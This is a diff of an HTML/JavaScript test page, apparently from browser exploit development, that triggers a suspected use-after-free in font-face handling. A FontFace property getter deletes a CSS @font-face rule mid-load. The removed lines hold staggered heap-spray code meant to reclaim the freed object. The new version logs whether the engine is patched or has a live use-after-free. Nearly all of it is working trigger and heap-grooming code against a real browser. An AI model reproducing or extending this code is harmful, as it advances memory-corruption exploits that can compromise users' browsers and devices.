@@ -2,64 +2,38 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P2 v16</title>
+<title>P2 v17</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
-<style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
+<style id="s0">@font-face { font-family: x; src: local(Helvetica Narrow); unicode-range: U+0042; }</style>
 </head>
 <body>
 <h3 id="st">stage A</h3>
 <pre id="out"></pre>
 <script>
-// Phase 2 v16: STAGGERED spray. Hypothesis: the CSSFontFace free is DEFERRED
-// past our getter-time spray on 14.23 (all previous sprays ran BEFORE the free).
-// Spray at 0/50/100/250/500/1000ms so one pass lands after the real free;
-// then .load() every sprayed face to drive the state machinery.
+// Phase 2 v17: THE DISCRIMINATOR. The rule face is now LOADABLE (local font).
+// After the getter deletes the rule mid-load:
+//   resolve  -> the Ref<> fix held the face alive -> PATCHED on 14.23
+//   hang/crash -> the face was freed mid-flight    -> VULNERABLE (UAF live)
+// Previous hang was innocent: nonexistent-font.woff could never complete.
 function log(s) { document.getElementById('out').textContent += s + "\n"; }
 
-log('PAGE VERSION: v16 (staggered same-class spray)');
+log('PAGE VERSION: v17 (loadable-rule discriminator)');
 log('UA = ' + navigator.userAgent);
 
-var faces = [];
-var NF = 60;                       // faces per staggered pass
-
-function facePass(pass) {
-  for (var i = 0; i < NF; i++) {
-    var f = new FontFace('p' + pass + 'x' + i, 'local(Helvetica)', {});
-    document.fonts.add(f);
-    faces.push(f);
-  }
-  log('spray pass ' + pass + ' at +' + (performance.now() | 0) + 'ms');
-}
-
-function scanFaces(tag) {
-  var weird = 0, loaded = 0, unloaded = 0, err = 0;
-  try {
-    for (var i = 0; i < faces.length; i++) {
-      var s = faces[i].status;
-      if (s === 'loaded') loaded++;
-      else if (s === 'unloaded') unloaded++;
-      else if (s === 'error') err++;
-      else { weird++; if (weird < 4) log('face ' + i + ' WEIRD: ' + s); }
-    }
-  } catch (e) { log('scan threw: ' + e); }
-  log('scan(' + tag + '): n=' + faces.length + ' loaded=' + loaded +
-      ' unloaded=' + unloaded + ' error=' + err + ' weird=' + weird +
-      ' set=' + document.fonts.status);
-  if (weird) log('SAME-CLASS RECLAIM SIGNAL');
-}
-
-function driveLoads() {
-  var n = 0;
-  for (var i = 0; i < faces.length; i++) {
-    try { faces[i].load().then(null, null); n++; } catch (e) {}
-  }
-  log('drove .load() on ' + n + ' faces');
+function control() {
+  // CONTROL (no trigger): the same load WITHOUT any deletion must resolve.
+  var B = new FontFace('c', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(B);
+  void B.loaded;
+  document.fonts.load('1em c', 'AB').then(
+    function (f) { log('CONTROL load resolved: ' + (f ? f.length : '?') + ' faces - good'); },
+    function (e) { log('CONTROL load rejected: ' + e + ' - local fonts unavailable, test invalid'); });
 }
 
 function trigger() {
   log('stage B: trigger in 3s');
   setTimeout(function () {
-    log('triggering');
+    log('triggering (loadable rule face)');
 
     var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -71,10 +45,9 @@ function trigger() {
       get: function () {
         fired++;
         if (this === A && fired === 1) {
-          log('GETTER FIRED - free at +' + (performance.now() | 0) + 'ms');
+          log('GETTER FIRED - deleting rule now');
           try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
           document.body.offsetTop;
-          facePass(0);                          // getter-time spray
         }
         return undefined;
       }
@@ -84,29 +57,23 @@ function trigger() {
       document.fonts.load('1em x', 'AB').then(
         function (f) {
           log('load RESOLVED with ' + (f ? f.length : '?') + ' faces');
-          if (f) for (var i = 0; i < f.length; i++)
-            log('  face ' + i + ': ' + (f[i] && f[i].family) +
-                ' status=' + (f[i] && f[i].status));
+          log('=> FACE SURVIVED THE DELETE = Ref<> fix present = PATCHED');
         },
-        function (e) { log('load rejected: ' + e); });
+        function (e) {
+          log('load rejected: ' + e);
+          log('=> face failed after delete - ambiguous, examine error');
+        });
     } catch (e) { log('load threw: ' + e); }
 
-    // STAGGERED passes: whichever lands after the deferred free reclaims it
-    var delays = [50, 100, 250, 500, 1000], di = 0;
-    function nextPass() {
-      if (di >= delays.length) return;
-      facePass(delays[di] / 50);
-      di++;
-      setTimeout(nextPass, delays[di - 1] === 1000 ? 0 : delays[di] - delays[di - 1]);
-    }
-    setTimeout(nextPass, 50);
-
-    setTimeout(function () { driveLoads(); scanFaces('2s'); }, 2000);
-    setTimeout(function () { scanFaces('6s'); }, 6000);
+    setTimeout(function () {
+      log('no resolve after 5s => promise hung on the deleted face');
+      log('=> face could NOT complete after free = VULNERABLE (or rule-removal starves U+0042)');
+    }, 5000);
   }, 3000);
 }
 
-log('armed');
+log('armed - control first, then trigger');
+control();
 window.onload = trigger;
 </script>
 </body>
